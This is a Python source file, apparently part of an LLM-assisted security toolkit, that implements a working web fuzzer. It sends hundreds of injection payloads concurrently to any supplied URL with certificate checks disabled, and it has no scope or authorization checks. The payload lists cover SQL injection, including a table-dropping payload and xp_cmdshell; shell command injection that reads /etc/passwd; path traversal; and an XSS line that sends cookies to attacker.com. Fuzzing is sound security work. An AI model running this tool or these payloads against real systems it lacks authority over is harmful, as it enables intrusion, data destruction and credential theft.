# tools/genesis_fuzzer.py
# --- VERSION 7.5 - Genesis Protocol Fuzzer ---
"""
The "Genesis" Protocol Fuzzer - Generative Grammar-Based Fuzzing

Implements a Grammar-Based Fuzzer that generates thousands of edge-case mutations
to discover zero-day vulnerabilities. Instead of relying on signature-based tools,
Genesis analyzes protocol structure and generates smart mutations.
"""

import random
import string
import re
import asyncio
import aiohttp
import logging
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode

logger = logging.getLogger(__name__)


class GenesisFuzzer:
    """
    Implements a Grammar-Based Fuzzer.
    The LLM defines the structure; Genesis breaks it.
    """
    
    def __init__(self):
        """Initialize the Genesis fuzzer with mutation strategies"""
        self.mutation_strategies = [
            self._bit_flip,
            self._integer_overflow,
            self._format_string_injection,
            self._boundary_violation,
            self._unicode_injection,
            self._null_byte_injection,
            self._command_injection
        ]
        self.grammar = {}
        self.max_mutations_per_field = 50
        
    def compile_grammar(self, llm_grammar_definition: dict):
        """
        Accepts a JSON schema from the LLM defining the target protocol.
        
        Args:
            llm_grammar_definition: Dictionary defining protocol structure
                Example: {
                    "username": {"type": "string", "max_len": 20},
                    "age": {"type": "integer", "min": 0, "max": 120},
                    "email": {"type": "email"}
                }
        """
        self.grammar = llm_grammar_definition
        logger.info(f"[Genesis] Compiled grammar with {len(self.grammar)} fields")
        
    def _bit_flip(self, base_val):
        """Bit flip mutations for binary protocols"""
        if isinstance(base_val, int):
            return [base_val ^ 1, base_val ^ 0xFF, base_val ^ 0xFFFF]
        return []
    
    def _integer_overflow(self, base_val):
        """Smart integer edge cases for overflow/underflow detection"""
        return [
            0,                      # Zero
            -1,                     # Negative one
            1,                      # One
            255,                    # 8-bit max (unsigned)
            256,                    # 8-bit overflow
            -128,                   # 8-bit min (signed)
            127,                    # 8-bit max (signed)
            65535,                  # 16-bit max (unsigned)
            65536,                  # 16-bit overflow
            -32768,                 # 16-bit min (signed)
            32767,                  # 16-bit max (signed)
            2147483647,             # 32-bit max (signed)
            2147483648,             # 32-bit overflow
            -2147483648,            # 32-bit min (signed)
            4294967295,             # 32-bit max (unsigned)
            9223372036854775807,    # 64-bit max (signed)
            -9223372036854775808,   # 64-bit min (signed)
            99999999999999999,      # Large number
        ]
    
    def _format_string_injection(self, base_str):
        """Format string vulnerability probes"""
        return [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%p%p%p%p%p%p%p%p%p%p",
            "%.1000d",
            "%1000000s",
            "%0d",
            "%s" * 100,
        ]
    
    def _boundary_violation(self, base_str):
        """Buffer overflow and boundary probing"""
        return [
            "A" * 10,               # Small buffer
            "A" * 100,              # Medium buffer
            "A" * 1000,             # Large buffer
            "A" * 5000,             # Very large buffer
            "A" * 10000,            # Huge buffer
            "A" * 65535,            # Max 16-bit buffer
            "%n" * 10,              # Format string repeats
            "{{7*7}}" * 10,         # Template injection
            "${7*7}" * 10,          # Alternative template
        ]
    
    def _unicode_injection(self, base_str):
        """Unicode and encoding edge cases"""
        return [
            "\u0000",               # Null character
            "\uFFFD",               # Replacement character
            "\u202E",               # Right-to-left override
            "\u200B",               # Zero-width space
            "﷽",                    # Bismillah symbol (longest single char)
            "𝕳𝖊𝖑𝖑𝖔",              # Mathematical alphanumeric
            "™",                    # Special symbols
            "../../etc/passwd",     # Path traversal
            "..\\..\\windows\\system32",
        ]
    
    def _null_byte_injection(self, base_str):
        """Null byte and termination character injection"""
        return [
            base_str + "\x00",
            base_str + "\x00.jpg",
            base_str + "%00",
            base_str + "\x00\x00\x00",
            "\x00" + base_str,
        ]
    
    def _command_injection(self, base_str):
        """Command injection and code execution patterns"""
        return [
            "'; exec('ls'); --",
            "'; system('id'); --",
            "| whoami",
            "; cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& dir",
            "|| ls -la",
            "; ping -c 1 127.0.0.1",
            "';SELECT SLEEP(5)--",
            "') OR '1'='1",
            "admin' --",
            "' OR 1=1--",
            "1' AND 1=0 UNION ALL SELECT 'admin', 'pass'--",
        ]
    
    def _sql_injection(self, base_str):
        """SQL injection patterns"""
        return [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "admin'--",
            "1' OR '1' = '1",
            "' UNION SELECT NULL--",
            "1' AND 1=0 UNION ALL SELECT table_name FROM information_schema.tables--",
            "'; EXEC xp_cmdshell('dir'); --",
            "' WAITFOR DELAY '00:00:05'--",
        ]
    
    def _xss_injection(self, base_str):
        """Cross-site scripting patterns"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
        ]
    
    def generate_mutations(self, payload_template: dict) -> List[Dict]:
        """
        Generates smart variants of a request based on grammar rules.
        
        Args:
            payload_template: Dictionary with fields and their base values
                Example: {"username": "admin", "age": 25}
        
        Returns:
            List of mutated payloads
        """
        mutations = []
        
        for field, base_value in payload_template.items():
            # Get field rules from grammar if available
            field_rules = self.grammar.get(field, {"type": "string"})
            field_type = field_rules.get("type", "string")
            
            # Generate mutations based on field type
            if field_type == "integer":
                for mutated_val in self._integer_overflow(base_value):
                    variant = payload_template.copy()
                    variant[field] = mutated_val
                    mutations.append(variant)
            
            elif field_type == "string":
                # Apply multiple string mutation strategies
                strategies = [
                    self._boundary_violation,
                    self._format_string_injection,
                    self._unicode_injection,
                    self._null_byte_injection,
                    self._command_injection,
                    self._sql_injection,
                    self._xss_injection
                ]
                
                for strategy in strategies:
                    for mutated_val in strategy(str(base_value))[:5]:  # Limit per strategy
                        variant = payload_template.copy()
                        variant[field] = mutated_val
                        mutations.append(variant)
            
            elif field_type == "boolean":
                for mutated_val in [True, False, "true", "false", 1, 0, "1", "0", None]:
                    variant = payload_template.copy()
                    variant[field] = mutated_val
                    mutations.append(variant)
        
        logger.info(f"[Genesis] Generated {len(mutations)} mutations from template")
        return mutations[:1000]  # Cap at 1000 mutations to avoid resource exhaustion
    
    async def fuzz_endpoint(
        self, 
        url: str, 
        method: str = "POST", 
        grammar: dict = None,
        base_payload: dict = None,
        headers: dict = None,
        timeout: int = 5
    ) -> Dict[str, Any]:
        """
        The 'Zero-Day' Loop:
        1. Generate mutations
        2. Hammer endpoint with concurrent requests
        3. Analyze response time/size for 'blind' deviations
        
        Args:
            url: Target endpoint URL
            method: HTTP method (GET, POST, PUT, etc.)
            grammar: Grammar definition for the protocol
            base_payload: Base payload to mutate
            headers: HTTP headers
            timeout: Request timeout in seconds
        
        Returns:
            Dictionary with fuzzing results and anomalies
        """
        if grammar:
            self.compile_grammar(grammar)
        
        if not base_payload:
            base_payload = {}
        
        # Generate mutations
        mutants = self.generate_mutations(base_payload)
        
        logger.info(f"[*] Genesis: Deploying {len(mutants)} mutations against {url}...")
        
        # Track results for anomaly detection
        results = []
        anomalies = []
        
        # Configure session
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=20)
        timeout_config = aiohttp.ClientTimeout(total=timeout)
        
        async with aiohttp.ClientSession(
            connector=connector, 
            timeout=timeout_config,
            headers=headers or {}
        ) as session:
            # Create tasks for concurrent fuzzing
            tasks = []
            for idx, mutant in enumerate(mutants):
                task = self._execute_mutation(session, url, method, mutant, idx)
                tasks.append(task)
            
            # Execute with concurrency control (batches of 50)
            batch_size = 50
            for i in range(0, len(tasks), batch_size):
                batch = tasks[i:i + batch_size]
                batch_results = await asyncio.gather(*batch, return_exceptions=True)
                results.extend([r for r in batch_results if not isinstance(r, Exception)])
        
        # Analyze results for anomalies
        anomalies = self._analyze_results_for_anomalies(results)
        
        logger.info(f"[*] Genesis: Completed fuzzing. Found {len(anomalies)} anomalies.")
        
        return {
            "total_mutations": len(mutants),
            "successful_requests": len(results),
            "anomalies": anomalies,
            "summary": self._generate_summary(results, anomalies)
        }
    
    async def _execute_mutation(
        self, 
        session: aiohttp.ClientSession, 
        url: str, 
        method: str, 
        payload: dict,
        idx: int
    ) -> Dict[str, Any]:
        """Execute a single mutation and track results"""
        import time
        start_time = time.time()
        
        try:
            if method.upper() == "GET":
                async with session.get(url, params=payload, ssl=False) as response:
                    content = await response.text()
                    elapsed = time.time() - start_time
                    
                    return {
                        "mutation_id": idx,
                        "payload": payload,
                        "status_code": response.status,
                        "content_length": len(content),
                        "response_time": elapsed,
                        "headers": dict(response.headers),
                        "content_preview": content[:200]
                    }
            else:  # POST, PUT, etc.
                async with session.request(
                    method.upper(), 
                    url, 
                    json=payload, 
                    ssl=False
                ) as response:
                    content = await response.text()
                    elapsed = time.time() - start_time
                    
                    return {
                        "mutation_id": idx,
                        "payload": payload,
                        "status_code": response.status,
                        "content_length": len(content),
                        "response_time": elapsed,
                        "headers": dict(response.headers),
                        "content_preview": content[:200]
                    }
        except asyncio.TimeoutError:
            return {
                "mutation_id": idx,
                "payload": payload,
                "error": "timeout",
                "response_time": time.time() - start_time
            }
        except Exception as e:
            return {
                "mutation_id": idx,
                "payload": payload,
                "error": str(e),
                "response_time": time.time() - start_time
            }
    
    def _analyze_results_for_anomalies(self, results: List[Dict]) -> List[Dict]:
        """
        Analyze results for anomalies that may indicate vulnerabilities.
        
        Anomalies include:
        - Different status codes than baseline
        - Significantly different response times (blind SQLi/RCE)
        - Different content lengths
        - Error messages in responses
        """
        if not results:
            return []
        
        anomalies = []
        
        # Calculate baseline metrics
        valid_results = [r for r in results if "error" not in r]
        if not valid_results:
            return anomalies
        
        status_codes = [r["status_code"] for r in valid_results]
        content_lengths = [r["content_length"] for r in valid_results]
        response_times = [r["response_time"] for r in valid_results]
        
        # Most common status code is the baseline
        from collections import Counter
        baseline_status = Counter(status_codes).most_common(1)[0][0] if status_codes else 200
        
        # Calculate average and std deviation for response metrics
        avg_length = sum(content_lengths) / len(content_lengths) if content_lengths else 0
        avg_time = sum(response_times) / len(response_times) if response_times else 0
        
        # Detect anomalies
        for result in valid_results:
            reasons = []
            
            # Status code deviation
            if result["status_code"] != baseline_status:
                reasons.append(f"Status code {result['status_code']} differs from baseline {baseline_status}")
            
            # Content length deviation (>50% difference)
            if avg_length > 0 and abs(result["content_length"] - avg_length) / avg_length > 0.5:
                reasons.append(f"Content length {result['content_length']} differs significantly from average {avg_length:.0f}")
            
            # Response time deviation (>300% difference - potential blind injection)
            if avg_time > 0 and result["response_time"] > avg_time * 3:
                reasons.append(f"Response time {result['response_time']:.2f}s is significantly slower than average {avg_time:.2f}s (possible blind injection)")
            
            # Check for error messages in content
            content_lower = result.get("content_preview", "").lower()
            error_keywords = ["error", "exception", "stack trace", "sql", "syntax", "fatal"]
            if any(keyword in content_lower for keyword in error_keywords):
                reasons.append("Error messages detected in response")
            
            if reasons:
                anomalies.append({
                    "mutation_id": result["mutation_id"],
                    "payload": result["payload"],
                    "status_code": result["status_code"],
                    "content_length": result["content_length"],
                    "response_time": result["response_time"],
                    "reasons": reasons,
                    "severity": self._calculate_severity(reasons)
                })
        
        # Sort by severity
        anomalies.sort(key=lambda x: x["severity"], reverse=True)
        
        return anomalies
    
    def _calculate_severity(self, reasons: List[str]) -> int:
        """Calculate severity score based on anomaly reasons"""
        severity = 0
        for reason in reasons:
            if "error message" in reason.lower():
                severity += 5
            if "blind injection" in reason.lower():
                severity += 4
            if "status code" in reason.lower():
                severity += 3
            if "content length" in reason.lower():
                severity += 2
        return severity
    
    def _generate_summary(self, results: List[Dict], anomalies: List[Dict]) -> str:
        """Generate a human-readable summary of fuzzing results"""
        total = len(results)
        errors = len([r for r in results if "error" in r])
        anomaly_count = len(anomalies)
        
        summary = f"Fuzzing Summary:\n"
        summary += f"  Total Mutations: {total}\n"
        summary += f"  Errors: {errors}\n"
        summary += f"  Anomalies Found: {anomaly_count}\n"
        
        if anomalies:
            summary += f"\nTop Anomalies:\n"
            for i, anomaly in enumerate(anomalies[:5], 1):
                summary += f"  {i}. Severity {anomaly['severity']}: {', '.join(anomaly['reasons'][:2])}\n"
        
        return summary


# Singleton instance
_genesis_fuzzer_instance = None

def get_genesis_fuzzer() -> GenesisFuzzer:
    """Get or create the singleton Genesis fuzzer instance"""
    global _genesis_fuzzer_instance
    if _genesis_fuzzer_instance is None:
        _genesis_fuzzer_instance = GenesisFuzzer()
    return _genesis_fuzzer_instance
